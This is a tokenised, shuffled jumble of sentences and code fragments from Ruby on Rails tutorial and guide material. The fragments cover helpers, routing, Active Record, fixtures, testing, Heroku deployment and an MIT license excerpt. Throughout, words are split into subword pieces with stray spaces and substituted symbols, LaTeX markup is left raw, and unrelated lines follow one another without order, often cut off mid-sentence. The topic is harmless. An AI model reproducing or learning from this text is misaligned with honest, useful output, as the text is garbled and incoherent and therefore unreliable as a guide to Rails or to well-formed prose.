▁The ▁\ k ode { full \_ title } ▁helper ▁returns ▁a ▁base ▁title , ▁`` Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App '' , ▁if ▁no ▁page ▁title ▁is ▁defined , ▁and ▁add s ▁a ▁vertical ▁bar ▁pre c ed ed ▁by ▁the ▁page ▁title ▁if ▁one ▁is ▁defined ▁( Listing ~\ ref { code : title _ helper })
▁$ ▁ cd ▁blog
▁Conditions
▁To ▁get ▁us ▁started , ▁the ▁command ▁in ▁Listing ~\ ref { code : generate _ user _ model } ▁produce d ▁an ▁initial ▁test ▁for ▁testing ▁users , ▁though ▁in ▁this ▁case ▁it ' s ▁practical ly ▁blank ▁( Listing ~\ ref { code : default _ user _ test }) .
▁\ emph { Note } : ▁If ▁you ▁do ▁end ▁up ▁using ▁Heroku ▁for ▁a ▁real - life ▁application , ▁be ▁sure ▁to ▁follow ▁the ▁production ▁ webserver ▁configuration ▁in ▁Section ~\ ref { sec : professional _ grade _ deployment } .
▁ 53 ▖ ordinalize ▁# ▁=> ▁" 53 r d "
▁We ▁ begin ▁the ▁Microposts ▁resource ▁by ▁creating ▁a ▁Micropost ▁model , ▁which ▁capture s ▁the ▁essential ▁character ist ic s ▁of ▁microposts .
▁The ▁same ▁parallel ▁structure ▁applies ▁to ▁ deleting ▁users , ▁with ▁\ k ode { delete } ▁instead ▁of ▁\ k ode { post } .
▁We ▁can ▁use ▁` content _ for ` ▁to ▁include ▁this ▁JavaScript ▁on ▁our ▁special ▁page ▁without ▁ fa tt en ing ▁up ▁the ▁rest ▁of ▁the ▁site .
▁" helpers / # { module _ path } _ helper "
▁@ part ▖ assemblies ▖ delete (@ assembly 1 )
▁# ▁save ▁a ▁reference ▁to ▁the ▁original ▁process ▁method
▁You ▁can ▁help ▁test ▁perform ance ▁with ▁these ▁addition s ▁to ▁your ▁test ▁environment :
▁Rails ▁helpers ▁often ▁take ▁options ▁hashes ▁in ▁this ▁way , ▁giv ing ▁us ▁the ▁flexibility ▁to ▁add ▁arbitrar y ▁HTML ▁options ▁without ▁ever ▁leav ing ▁Rails .
▁It ▁will ▁also ▁create ▁the ▁` preview _ new _ comment _ url ` ▁and ▁` preview _ new _ comment _ path ` ▁route ▁helpers .
▁Note ▁that , ▁as ▁in ▁the ▁profile ▁ sidebar ▁( Listing ~\ ref { code : user _ show _ microposts }), ▁the ▁user ▁ info ▁in ▁Listing ~\ ref { code : user _ info } ▁display s ▁the ▁total ▁number ▁of ▁microposts ▁for ▁the ▁user .
▁In ▁addition , ▁the ▁code ▁take s ▁advantage ▁of ▁some ▁of ▁the ▁methods ▁available ▁for ▁an ╼ association ▖
▁ namespace ▁: admin ▁do
▁* ▁` save `
▁| ▁| ▁4 11 ▁| ▁: length _ require d ▁|
▁You ▁can ▁leave ▁out ▁the ▁`: on ` ▁option , ▁this ▁will ▁create ▁the ▁same ▁ member ▁route ▁except ▁that ▁the ▁resource ▁id ▁value ▁will ▁be ▁available ▁in ▁` params [: photo _ id ]` ▁instead ▁of ▁` params [: id ]` .
▁After ▁that , ▁it ▁a d just s ▁the ▁time ▁calling ▁` since ` ▁with ▁the ▁number ▁of ▁second s ▁to ▁ advance ▖
▁Defaults ▁to ▁`: controller ` .
▁C a ref ul ly ▁ inspect ing ▁the ▁debug ▁information ▁in ▁Figure ~\ ref { fig : initial _ failed _ signin _ rails _3} ▁shows ▁that , ▁as ▁hint ed ▁at ▁the ▁end ▁of ▁Section ~\ ref { sec : signin _ form }, ▁the ▁submission ▁results ▁in ▁a ▁\ k ode { params } ▁hash ▁containing ▁the ▁email ▁and ▁password ▁under ▁the ▁key ▁\ k ode { session }, ▁which ▁( o m it ting ▁some ▁irrelevant ▁details ▁used ▁internally ▁by ▁Rails ) ▁appears ▁as ▁follows :
▁* ▁` template _ engine ` ▁defines ▁which ▁template ▁engine ▁to ▁use , ▁such ▁as ▁ ERB ▁or ▁H a m l ▖
▁display : ▁table ;
▁Wi ll ▁be ▁available ▁if ▁` config ▖ force _ ssl ` ▁is ▁set ▁to ▁` true ` ▖
▁< ▁Choos e ▁' squash ' ▁for ▁all ▁of ▁your ▁commit s ▁except ▁the ▁first ▁one ▖ ▁>
▁* ▁How ▁to ▁handle ▁Ajax ▁on ▁the ▁server ▁ side .
▁url : ▁ sqlite 3 : NOT _ my _ database
▁The ▁\ emph { Rails ▁Tutorial } ▁cover s ▁all ▁the ▁web - specific ▁idea s ▁you ' ll ▁need , ▁so ▁don ' t ▁worry ▁if ▁you ▁don ' t ▁current ly ▁know ▁a ▁\ text tt { POST } ▁from ▁a ▁\ text tt { PATCH } .
▁Because ▁the ▁practice ▁of ▁adding ▁Ajax ▁to ▁web ▁forms ▁is ▁quite ▁common , ▁Rails ▁make s ▁Ajax ▁easy ▁to ▁implement .
▁### ▁` acts _ like ?(
▁As ▁show n ▁in ▁Figure ~\ ref { fig : cloud 9 _ new _ workspace }, ▁create ▁a ▁ workspace ▁called ▁`` rails - tutorial '' ▁(\ emph { not } ▁`` rails \_ tutorial '') , ▁set ▁it ▁to ▁`` P ri v ate ▁to ▁the ▁people ▁I ▁in v ite '' , ▁and ▁select ▁the ▁ icon ▁for ▁the ▁Rails ▁Tutorial ▁(\ emph { not } ▁the ▁ icon ▁for ▁Ruby ▁on ▁Rails )
▁Add ▁this ▁address ▁to ▁the ▁list ▁of ▁invalid ▁addresses ▁in ▁Listing ~\ ref { code : email _ format _ validation _ tests } ▁to ▁get ▁a ▁failing ▁test , ▁and ▁then ▁use ▁the ▁more ▁complicated ▁ regex ▁show n ▁in ▁Listing ~\ ref { code : be tt er _ email _ regex } ▁to ▁get ▁the ▁test ▁to ▁pass .
▁We ▁end ▁our ▁to ur ▁of ▁Ruby ▁with ▁a ▁complete ▁class ▁of ▁our ▁own , ▁a ▁\ k ode { User } ▁class ▁that ▁an tic ip ate s ▁the ▁User ▁model ▁ com ing ▁up ▁in ▁Chapter ~\ ref { cha : modeling _ users } .
▁ Log in ▁status ▁is ▁determine d ▁by ▁the ▁presence ▁of ▁a ▁current ▁user ▁base d ▁on ▁the ▁temporary ▁session ' s ▁user ▁id ▁or ▁the ▁ permanent ▁session ' s ▁unique ▁remember ▁token .
▁S up press ing ▁the ▁ ri ▁and ▁ rdoc ▁documentation ▁in ▁\ k ode { ▖ gem r c } .
▁in ▁Listing ~\ ref { code : signin _ feature s } ▁and
▁# ▁ delegate s ▁to ▁the ▁receiver ' s ▁class
▁Here ▁the ▁second ▁command , ▁\ k ode { git ▁branch }, ▁just ▁list s ▁all ▁the ▁local ▁branch es , ▁and ▁the ▁as ter is k ~\ k ode { * } ▁identifie s ▁which ▁branch ▁we ' re ▁current ly ▁on .
▁One ▁of ▁the ▁most ▁common ▁job s ▁in ▁a ▁mode r n ▁web ▁application ▁is ▁sending ▁email s ▁out side ╼ of ▁the ▁request - response ▁c y c le , ▁so ▁the ▁user ▁doesn ' t ▁have ▁to ▁wait ▁on ▁it ▖
▁The ▁third ▁line ▁is ▁included ▁only ▁to ▁ensure ▁forward - compatibility ▁with ▁an ▁up com ing ▁release ▁of ▁Git .
▁You ▁should ▁put ▁the ▁` root ` ▁route ▁at ▁the ▁to p ▁of ▁the ▁file , ▁because ▁it ▁is ▁the ▁most ▁popular ▁route ▁and ▁should ▁be ▁match ed ▁first .
▁### ▁P ure ▁ String ▁Conditions
▁The ▁full ▁list ▁of ▁our ▁plan n ed ▁links ▁appears ▁in ▁Table ~\ ref { table : url _ m app ing }, ▁along ▁with ▁their ▁m app ing ▁to ▁URLs ▁and ▁routes .
▁To ▁make ▁some ▁actual ▁microposts , ▁we ▁enter ▁information ▁at ▁the ▁new ▁microposts ▁page , ▁\ href { http ://0▖0▖0▖0:3000/ microposts / new }{/ microposts / new }, ▁as ▁seen ▁in ▁Figure ~\ ref { fig : demo _ new _ micropost _ rails _3} .
▁to ▁retrieve ▁the ▁user .
▁I ▁es pecially ▁recommend ▁using ▁\ href { http :// in duction app ▖ com /}{ In duction } ▁to ▁ connect ▁to ▁and ▁view ▁the ▁local ▁PostgreSQL ▁database .
▁* ▁` config ▖ action _ mailer ▖ observers ` ▁ register s ▁ observers ▁which ▁will ▁be ▁not if i ed ▁when ▁mail ▁is ▁ deliver ed .
▁This ▁route ▁provides ▁the ▁ detailed ▁information ▁such ▁as ▁Rails ▁and ▁Ruby ▁version ▁for ▁` public / index ▖ html ` ▁in ▁a ▁default ▁Rails ▁application .
▁=> ▁[" user @ foo .
▁#### ▁capture
▁class _ name : ▁" User ",
▁F ur the r more , ▁the ▁filename ▁\ k ode { custom ▖ css ▖ scss } ▁includes ▁the ▁\ k ode { ▖ css } ▁extension , ▁which ▁indicates ▁a ▁CSS ▁file , ▁and ▁the ▁\ k ode { ▖ scss } ▁extension , ▁which ▁indicates ▁a ▁`` Sass y ▁CSS '' ▁file ▁and ▁arrange s ▁for ▁the ▁asset ▁pipeline ▁to ▁process ▁the ▁file ▁using ▁Sass .
▁In ▁the ▁process ▁of ▁writing ▁the ▁tests , ▁we ' ll ▁be ▁ force d ▁to ▁design ▁aspect s ▁of ▁the ▁application , ▁which ▁is ▁one ▁of ▁the ▁nice ▁ side - e ffect s ▁of ▁test - driven ▁development .
▁<%= ▁javascript _ include _ tag ▁" main " ▁%>
▁\ label { fig : new _ readme } }╼\ end { figure }╼╼ ▁% ▁section ▁version _ control ▁( end )╼╼ ▁\ section { D e p lo y ing } ▁% ▁( fold )╼ ▁\ label { sec : deploying }╼╼
▁The ▁name ▁may ▁be ▁given ▁as ▁a ▁symbol ▁or ▁string ▖
▁Pass ing ▁a ▁` String ` ▁to ▁` get ` ▁will ▁expect ▁a ▁` controller # action ` ▁format , ▁while ▁passing ▁a ▁` Symbol ` ▁will ▁map ▁directly ▁to ▁an ▁action :
▁Active ▁Support ▁extend s ▁the ▁method ▁` Range # to _ s ` ▁so ▁that ▁it ▁understand s ▁an ▁optional ▁format ▁argument ▖
▁The ▁user ▁index ▁view .
▁Active ▁Record ▁allows ▁you ▁to ▁validate ▁the ▁state ▁of ▁a ▁model ▁before ▁it ▁get s ▁written ╼ in to ▁the ▁database ▖
▁ umerate }╼╼ ▁% ▁subsection ▁login _ form ▁( end )╼╼ ▁\ subsection { Fi nd ing ▁and ▁ authenticating ▁a ▁user } ▁% ▁( fold )╼ ▁\ label { sec : find ing _ and _ authenticating _ a _ user }╼╼
▁" table s "▖ singularize ▁# ▁=> ▁" table "
▁The ▁` deep _ dup ` ▁method ▁returns ▁ deep ▁copy ▁of ▁a ▁given ▁object ▖
▁The ▁page ▁to ▁show ▁a ▁user ▁(\ href { http :// localhost :3000/ users /1}{/ users /1 }) .
▁In ▁Rails , ▁web ▁requests ▁are ▁handle d ▁by ▁Action ▁Pack , ▁which ▁ split s ▁the ▁work ▁into ▁a ▁controller ▁part ▁( perform ing ▁the ▁logic ) ▁and ▁a ▁view ▁part ▁( render ing ▁a ▁template )▖
▁module ▁ Z
▁These ▁chapter s ▁will ▁introduce ▁some ▁of ▁the ▁most ▁powerful ▁features ▁of ▁Rails , ▁including ▁data ▁ modeling ▁with ▁\ k ode { has \_ many } ▁and ▁\ k ode { has \_ many ▁through } .
▁# ▁no ▁regular ▁words ▁or ▁you ' ll ▁be ▁expose d ▁to ▁ dictionary ▁attacks .
▁When ▁push ing ▁up ▁the ▁repository , ▁ answer ▁ y es ▁if ▁you ▁see ▁the ▁question ▁`` A re ▁you ▁sure ▁you ▁want ▁to ▁con t in ue ▁ connect ing ▁( y es / no ) ? ''
▁* ▁ Updating ▁the ▁ schema
▁You ' re ▁not ▁ limited ▁to ▁the ▁functionality ▁that ▁Rails ▁automatically ▁build s ▁into ▁association ▁ proxy ▁objects ▖
▁in ▁Listing ~\ ref { code : micropost _ ordering } .
▁The ▁user ▁show ▁page ▁at ▁\ href { http :// localhost :3000/ users /1}{/ users /1 } ▁after ▁adding ▁a ▁Users ▁resource ▖ ~\ href { http :// railstutorial ▖ org / images / figures / user _ show _ bootstrap - full ▖ png }{( full ▁size )}
▁### ▁D y na m ic ▁S eg ment s
▁# ▁This ▁block ▁is ▁called ▁within ▁a ▁ transaction ,
▁<%= ▁link _ to ▁" New ▁Article ", ▁new _ article _ path ▁%>
▁In ▁particular , ▁by ▁using ▁the ▁Rails ▁library ▁called ▁\ emph { Active ▁Record }, ▁the ▁code ▁in ▁Listing ~\ ref { code : demo _ user _ model } ▁arrange s ▁for ▁\ k ode { User ▖ all } ▁to ▁return ▁all ▁the ▁users ▁in ▁the ▁database .
▁By ▁convention , ▁Rails ▁ assumes ▁that ▁the ▁column ▁in ▁the ▁join ▁table ▁used ▁to ▁hold ▁the ▁foreign ▁key ▁point ing ▁to ▁this ▁model ▁is ▁the ▁name ▁of ▁this ▁model ▁with ▁the ▁ suffix ▁` _ id ` ▁added ▖
▁| ▁db / migrate / 20 140 1 20 20 10 10 _ create _ comments ▖ rb ▁| ▁ Migration ▁to ▁create ▁the ▁comments ▁table ▁in ▁your ▁database ▁( your ▁name ▁will ▁include ▁a ▁different ▁timestamp ) ▁|
▁With ▁the ▁fixture ▁user ▁as ▁above , ▁we ▁can ▁now ▁write ▁a ▁test ▁for ▁the ▁layout ▁links ▁by ▁convert ing ▁the ▁ sequence ▁ enumerate d ▁at ▁the ▁beginning ▁of ▁this ▁section ▁into ▁code , ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ login _ test _ valid _ information } .
▁We ▁can ▁express ▁this ▁in ▁code ▁by ▁updating ▁the ▁User ▁and ▁Micropost ▁models ▁as ▁in ▁Listing ~\ ref { code : demo _ user _ has _ many _ microposts } ▁and ▁Listing ~\ ref { code : demo _ micropost _ belongs _ to _ user } .
▁The ▁method ▁` sum ` ▁add s ▁the ▁elements ▁of ▁an ▁ enumerable :
▁Format s ▁a ▁number ▁into ▁a ▁U S ▁ phone ▁number .
▁Rails ▁a do p t s ▁the ▁convention ▁of ▁a ▁\ k ode { : success } ▁key ▁for ▁a ▁message ▁indicat ing ▁a ▁successful ▁result ▁( Listing ~\ ref { code : signup _ flash }) .
▁You ▁will ▁need ▁to ▁add ▁the ▁` actionpack - action _ caching ` ▁gem ▁in ▁order ▁to ▁use ▁` cache s _ action ` ▁and ▁the ▁` actionpack - page _ caching ` ▁to ▁use ▁` cache s _ pages ` ▁in ▁your ▁controllers .
▁A c knowledg ment s
▁Some ▁browsers ▁offer ▁a ▁`` \ href { http :// stack overflow ▖ com / questions / 20 44 9 64 1 / rails - 4 - session - value - never - expire s - or - d ies - when - browser - close s } { remember ▁where ▁I ▁left ▁off } '' ▁feature , ▁which ▁re store s ▁the ▁session ▁automatically , ▁so ▁be ▁sure ▁to ▁disable ▁any ▁such ▁feature ▁before ▁try ing ▁to ▁log ▁out .
▁Using ▁a ▁class ▁method ▁is ▁the ▁preferred ▁way ▁to ▁accept ▁arguments ▁for ▁scope s ▖
▁Because ▁we ▁did n ' t ▁pass ▁the
▁With ▁the ▁routes ▁defined ▁in ▁Listing ~\ ref { code : static _ page _ routes }, ▁we ' re ▁now ▁in ▁a ▁position ▁to ▁use ▁the ▁result ing ▁named ▁routes ▁in ▁the ▁site ▁layout .
▁The ▁feed ▁for ▁a ▁user ▁( id ▁1) ▁following ▁users ▁with ▁id s ▁2, ▁7 , ▁ 8, ▁and ▁10 .
▁ delegate ▁: size , ▁to : ▁: attachment , ▁prefix : ▁: avatar
▁Instead , ▁` / photos / R R 27 ` ▁would ▁match .
▁( This ▁is ▁the ▁kind ▁of ▁detail ▁you ▁could ▁easily ▁ forget ▁initially , ▁which ▁is ▁why ▁ acceptance ▁testing ▁( and ▁ TDD ▁generally ) ▁require ▁a ▁certain ▁level ▁of ▁experience ▁to ▁be ▁effective ▖)
▁* ▁Set s ▁` env [" rack ▖ multi th read "] ` ▁flag ▁to ▁` false ` ▁and ▁wrap s ▁the ▁application ▁within ▁a ▁M ute x .
▁Rails ▁uses ▁the ▁Model - View - Controller ▁( MVC ) ▁pattern ▁for ▁ str u c t ur ing ▁web ▁applications .
▁The ▁ MIT ▁L ic en se ╼╼ Copy right ▁( c ) ▁2014 ▁ Michael ▁Hartl ╼╼ Permission ▁is ▁here by ▁gra nt ed , ▁free ▁of ▁charg e , ▁to ▁any ▁person ▁obtain ing ▁a ▁copy ╼ of ▁this ▁software ▁and ▁ associated ▁documentation ▁files ▁( the ▁" Software ") , ▁to ▁deal ╼ in ▁the ▁ Software ▁without ▁restrict ion , ▁including ▁without ▁ limit ation ▁the ▁right s ╼ to ▁use , ▁copy , ▁modify , ▁merge , ▁ publish , ▁distribute , ▁sub license , ▁and / or ▁ se ll ╼ co p ies ▁of ▁the ▁ Software , ▁and ▁to ▁ permit ▁person s ▁to ▁who m ▁the ▁ Software ▁is ╼ f ur n is h ed ▁to ▁do ▁so , ▁subject ▁to ▁the ▁following ▁conditions : ╼╼ The ▁above ▁copy right ▁notice ▁and ▁this ▁ permission ▁notice ▁shall ▁be ▁included ▁in ╼ all ▁copie s ▁or ▁substan tial ▁ port ion s ▁of ▁the ▁ Software .
▁This ▁will ▁fire ▁up ▁ WEBrick , ▁a ▁web ▁server ▁distribute d ▁with ▁Ruby ▁by ▁default ▖
▁ Welcome ▁to ▁the ▁\ href { http :// www ▖ railstutorial ▖ org / ruby - on - rails - tutorial - book }{\ emph { Ruby ▁on ▁Rails ▁Tutorial } } .
▁Rails ▁comes ▁with ▁built - in ▁support ▁for ▁[ SQLite 3 ]( http :// www ▖ sqlite ▖ org ), ▁which ▁is ▁a ▁light we ight ▁server less ▁database ▁application ▖
▁in ▁Listing ~\ ref { code : user _ pages _ spec } ▁and
▁L uckily , ▁as ▁we ' ve ▁seen ▁with ▁the ▁user ▁fixture ' s ▁\ k ode { password \_ digest } ▁attribute , ▁fixture ▁files ▁support ▁ embedded ▁Ruby , ▁which ▁\ line break ▁means ▁we ▁can ▁create ▁30 ▁ additional ▁users ▁as ▁show n ▁in ▁Listing ~\ ref { code : users _ fixtures _ extra _ users } .
▁> > ▁Rails ▖ env
▁The ▁corresponding ▁user ▁edit ▁view ▁( which ▁you ▁will ▁have ▁to ▁create ▁by ▁hand ) ▁is ▁show n ▁in ▁Listing ~\ ref { code : user _ edit _ view } .
▁In ▁addition , ▁using ▁\ k ode { text } ▁gives ▁us ▁ greater ▁flexibility ▁should ▁we ▁wish ▁to ▁increase ▁the ▁length ▁ limit ▁at ▁a ▁future ▁date ▁( as ▁part ▁of ▁inter n ation a li z ation , ▁for ▁example ) .
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : users _ resource }, ▁the ▁routing ▁works , ▁but ▁there ' s ▁ still ▁no ▁page ▁there ▁( Figure ~\ ref { fig : user _ show _ unknown _ action }) .
▁ ex port ▖ add _ invoices ( invoices )
▁S ince ▁ po ol ▁is ▁not ▁in ▁the ▁` ENV [' DAT A BASE _ URL ']` ▁provided ▁connection ▁information ▁its ▁information ▁is ▁merge d ▁in ▖
▁This ▁is ▁because ▁calling ▁\ k ode { User ▖ new } ▁doesn ' t ▁ touch ▁the ▁database ; ▁it ▁simply ▁creates ▁a ▁new ▁Ruby ▁object ▁in ▁memory .
▁Of ▁course , ▁users ▁should ▁be ▁able ▁to ▁ unfollow ▁other ▁users ▁as ▁well ▁as ▁follow ▁them , ▁which ▁lead s ▁to ▁the ▁some what ▁pre d ic table ▁\ k ode { unfollow !}
▁This ▁section ▁ explain s ▁how ▁to ▁run ▁your ▁application ▁inside ▁a ▁directory .
▁validates ▁: name , ▁presence : ▁ { ▁ strict : ▁true ▁ }
▁R epeat ▁steps ▁2 - - 5 ▁as ▁necessary .
▁An ▁\ k ode { authenticate } ▁method ▁that ▁returns ▁the ▁user ▁when ▁the ▁password ▁is ▁correct ▁( and ▁\ k ode { false } ▁otherwise )
▁If ▁you ▁have ▁a ▁` locked ` ▁field ▁on ▁the ▁` Client ` ▁model , ▁you ▁also ▁get ▁` find _ by _ locked ` ▁and ▁methods .
▁S ince ▁each ▁Rails ▁console ▁session ▁load s ▁the ▁local ▁Rails ▁environment , ▁we ▁can ▁even ▁create ▁a ▁controller ▁explicitly ▁and ▁examine ▁its ▁class ▁hierarchy
▁This ▁is ▁easy ▁using ▁the ▁\ k ode { log \_ in \_ as } ▁helper ▁ developed ▁in ▁Section ~\ ref { sec : remember _ tests } ▁( Listing ~\ ref { code : test _ helper _ log _ in }), ▁as ▁show n ▁in ▁Listing ~\ ref { code : edit _ tests _ logged _ in } .
▁### ▁` has _ one ` ▁Association ▁Reference
▁ Connection : ▁ K eep - A li ve
▁ LE F T ▁ OUT ER ▁JOIN ▁orders ▁ ON ▁orders ▖ client _ id ▁= ▁client ▖ id ▁WHERE
▁ ╼\ end { enumerate }╼╼ ▁% ▁subsection ▁ friendly _ forwarding ▁( end )╼╼ ▁% ▁section ▁protect ing _ pages ▁( end )╼╼ ▁\ section { Show ing ▁all ▁users } ▁% ▁( fold )╼ ▁\ label { sec : showing _ all _ users }╼╼
▁The ▁first ▁step ▁also ▁uses ▁Capybara , ▁while ▁the ▁second ▁uses ▁Capybara ' s ▁\ k ode { page } ▁object ▁with ▁RSpec ▖ ▁E v id ent ly , ▁all ▁the ▁testing ▁work ▁we ' ve ▁done ▁so ▁far ▁with ▁RSpec ▁and ▁Capybara ▁is ▁also ▁useful ▁with ▁Cucumber .
▁With ▁the ▁complet ion ▁of ▁the ▁Microposts ▁resource , ▁now ▁is ▁a ▁good ▁time ▁to ▁push ▁the ▁repository ▁up ▁to ▁Bitbucket :
▁In ▁practice , ▁the ▁ guidelines ▁above ▁mean ▁that ▁we ' ll ▁usually ▁write ▁controller ▁and ▁model ▁tests ▁first ▁and ▁integration ▁tests ▁( which ▁test ▁functionality ▁a cross ▁models , ▁views , ▁and ▁controllers ) ▁second .
▁The ▁` first ` ▁method ▁returns ▁` nil ` ▁if ▁no ▁matching ▁record ▁is ▁found ▁and ▁no ▁exception ▁will ▁be ▁raised .
▁# ▁=> ▁Fri , ▁ 15 ▁Oct ▁ 1582 ▁00:00:00 ▁+0000
▁Ju st ▁about ▁every ▁Rails ▁application ▁will ▁interact ▁with ▁a ▁database ▖
▁def ▁ initialize ( person )
▁" ruby "▖ pluralize ▁# ▁=> ▁" rubi es "
▁╼╼ ▁\ section { Adding ▁some ▁structure } ▁% ▁( fold )╼ ▁\ label { sec : structure }╼╼
▁* ▁` ( table _ name ) _ count ` ▁- ▁Use d ▁to ▁cache ▁the ▁number ▁of ▁ belonging ▁objects ▁on ╼ ▁associations ▖
▁user ▖ update ( name : ▁' Dave ')
▁It ▁also ▁cover s ▁how ▁to ▁test ▁your ▁ mailers .
▁We ' ll ▁render ▁the ▁ stats ▁partial ▁on ▁the ▁profile ▁page ▁in ▁a ▁moment , ▁but ▁first ▁let ' s ▁make ▁a ▁partial ▁for ▁the ▁follow / unfollow ▁button , ▁as ▁show n ▁in ▁Listing ~\ ref { code : follow _ form _ partial } .
▁As ▁a ▁final ▁refactoring , ▁we ' ll ▁a do p t ▁a ▁common ▁convention ▁and ▁define ▁a ▁\ k ode { current \_ user ?}\ ▁boolean ▁method ▁for ▁use ▁in ▁the ▁\ k ode { correct \_ user } ▁before ▁filter , ▁which ▁we ▁define ▁in ▁the ▁Sessions ▁helper ▁( Listing ~\ ref { code : current _ user _ p }) .
▁The ▁full ▁page ▁ flow ▁run s ▁as ▁follows : ▁a ▁user ▁( John ▁ Calvin ) ▁start s ▁at ▁his ▁profile ▁page ▁( Figure ~\ ref { fig : page _ flow _ profile _ mockup }) ▁and ▁navigate s ▁to ▁the ▁Users ▁page ▁( Figure ~\ ref { fig : page _ flow _ user _ index _ mockup }) ▁to ▁select ▁a ▁user ▁to ▁follow .
▁╼╼\ end { item ize }╼╼ ▁% ▁subsection ▁guide _ to _ f ur the r _ resources ▁( end )╼╼ ▁\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )╼ ▁\ label { sec : following _ users _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼\ item
▁The ▁`: file ` ▁option ▁take s ▁an ▁ absolute ▁file - system ▁path ▖
▁* ▁` includes `
▁( Note ▁that , ▁with ▁the ▁code ▁in ▁Listing ~\ ref { code : home _ root _ route }, ▁the ▁previous ▁route ▁\ k ode { static \_ pages / home } ▁will ▁no ▁longer ▁work ▖)
▁For ▁example , ▁the ▁following ▁route ▁will ▁not ▁work :
▁< li > <%= ▁ msg ▁%></ li >
▁Now ▁we ' ll ▁add ▁a ▁title ▁to ▁each ▁page , ▁getting ▁the ▁tests ▁from ▁Section ~\ ref { sec : testing _ title s } ▁to ▁pass ▁in ▁the ▁process .
▁Rails ▁uses ▁Rake ▁ ext en s ive ly , ▁es pecially ▁for ▁the ▁in n um er able ▁little ▁ administrative ▁task s ▁necessary ▁when ▁developing ▁database - back ed ▁web ▁applications .
▁config ▖ static _ cache _ control ▁= ▁' public , ▁ max - age = 36 00 '
▁We ' ll ▁get ▁to ▁the ▁Re d ▁part ▁of ▁the ▁Re d - Green ▁c y c le ▁by ▁writing ▁a ▁failing ▁test ▁for ▁the ▁About ▁page .
▁* ▁How ▁to ▁send ▁email s ▁from ▁your ▁application ▁as y n c .
▁Listing ~\ ref { code : production _ webserver _ config } ▁changes ▁the ▁format ting ▁slightly ▁so ▁that ▁the ▁code ▁fit s ▁in ▁the ▁standard ▁ 80 ▁columns .
▁Ruby ▁allows ▁us ▁to ▁do ▁this ▁using ▁the ▁\ k ode { self } ▁keyword : ▁inside ▁the ▁\ k ode { Word } ▁class , ▁\ k ode { self } ▁is ▁the ▁object ▁itself , ▁which ▁means ▁we ▁can ▁use
▁De p lo y ing ▁Rails ▁applications ▁used ▁to ▁be ▁a ▁pa in , ▁but ▁the ▁Rails ▁deployment ▁e co system ▁has ▁m at ur ed ▁ rap id ly ▁in ▁the ▁ past ▁few ▁ years , ▁and ▁now ▁there ▁are ▁sever al ▁great ▁options .
▁( We ' ll ▁learn ▁more ▁about ▁both ▁classes ▁and ▁inheritance ▁in ▁Section ~\ ref { sec : ruby _ classes } ▖)
▁ Adding ▁CSS ▁for ▁nice ▁ typography .
▁ SCSS ▁for ▁the ▁Home ▁page ▁ sidebar .
▁ ActiveSupport :: In f le c to r ▖ inflections ▁do ▁| inflect |
▁Then ▁we ▁check ▁that ▁destroying ▁the ▁user ▁reduce s ▁the ▁micropost ▁count ▁by ▁1 .
▁A ▁test ▁helper ▁to ▁sign ▁users ▁in .
▁This ▁section ▁should ▁only ▁be ▁attempt ed ▁by ▁fai r ly ▁advanced ▁users ▁and ▁can ▁be ▁skip ped ▁without ▁ lo s s ▁of ▁con t in u ity .
▁T h r ough out ▁the ▁rest ▁of ▁this ▁chapter , ▁you ▁m ight ▁find ▁it ▁helpful ▁to ▁consult ▁the ▁\ href { http :// ruby - doc ▖ org / core - 2▖ 0 /}{ Ruby ▁API } ▖ ▁It ' s ▁pa c k ed ▁( p erhaps ▁even ▁\ emph { to o } ▁pa c k ed ) ▁with ▁information ; ▁for ▁example , ▁to ▁learn ▁more ▁about ▁Ruby ▁strings ▁you ▁can ▁look ▁at ▁the ▁Ruby ▁API ▁entry ▁for ▁the ▁\ k ode { String } ▁class .
▁A ▁title ▁test .
▁The ▁\ emph { Rails ▁Tutorial } ▁often ▁shows ▁output ▁from ▁ various ▁program s ▁( s hell ▁commands , ▁version ▁control ▁status , ▁Ruby ▁program s , ▁etc ▖) .
▁The ▁default ▁Rails ▁way ▁to ▁do ▁this ▁is ▁to ▁use ▁\ emph { fixtures }, ▁which ▁are ▁a ▁way ▁of ▁ org an i z ing ▁data ▁to ▁be ▁loaded ▁into ▁the ▁test ▁database .
▁ }
▁group ▁: assets ▁do
▁# ▁=> ▁ { ▁' a w a it ing _ app r o val ' ▁=> ▁7 , ▁' p a id ' ▁=> ▁ 12 ▁ }
▁validates ▁: email , ▁presence : ▁true , ▁email : ▁true
▁### ▁N est ed ▁Resource s
▁* ▁` change ` ▁accept s ▁an ▁ additional ▁`: u sec ` ▁option .
▁The ▁result ing ▁\ k ode { admin \_ user } ▁before ▁filter ▁appears ▁in ▁Listing ~\ ref { code : admin _ destroy _ before _ filter } .
▁# ▁and ▁to ▁< tt > : update </ tt > ▁if ▁it ▁is ▁not .
▁### ▁` presence `
▁#### # ▁` prev _ week `, ▁` next _ week `
▁create ▁test / helpers / microposts _ helper _ test ▖ rb
▁ Write ▁a ▁single ▁test ▁or ▁small ▁group ▁of ▁tests .
▁* ▁`: counter _ cache `
▁This ▁view ▁uses ▁ embedded ▁Ruby ▁to ▁display ▁the ▁user ' s ▁name ▁and ▁email ▁address , ▁as sum ing ▁the ▁exist ence ▁of ▁an ▁instance ▁variable ▁called ▁\ k ode {@ user } .
▁#### ▁Create ▁a ▁Mailer ▁View
▁### ▁Basic ▁ Authentication
▁Re mov e ▁the ▁` secret _ token ▖ rb ` ▁initializer .
▁If ▁set , ▁they ▁h on or ▁the ▁user ▁time ▁ zone .
▁config ▖ assets ▖ prefix ▁= ▁' / asset - file s '
▁Here ' s ▁what ▁a ▁job ▁look s ▁like :
▁Over write ▁ / my app / config / application ▖ rb ?
▁Let ' s ▁check ▁the ▁status ▁to ▁see ▁what ▁changed :
▁hash ▁# ▁=> ▁ { : a =>1 }
▁In ▁the ▁source ▁the ▁generated ▁code ▁look ed ▁like ▁this :
▁* ▁` config ▖ time _ zone ` ▁set s ▁the ▁default ▁time ▁ zone ▁for ▁the ▁application ▁and ▁enable s ▁time ▁ zone ▁ aware ness ▁for ▁Active ▁Record .
▁< p > Product ▁Name : ▁<%= ▁ product ▖ name ▁%></ p >
▁do _ one _ th ing
▁` app / assets / stylesheets / blorgh / articles ▖ css ` ▖
▁### ▁To t al ▁of ▁group ed ▁ items
▁A ▁user ▁\ k ode { has \_ many } ▁microposts ▖
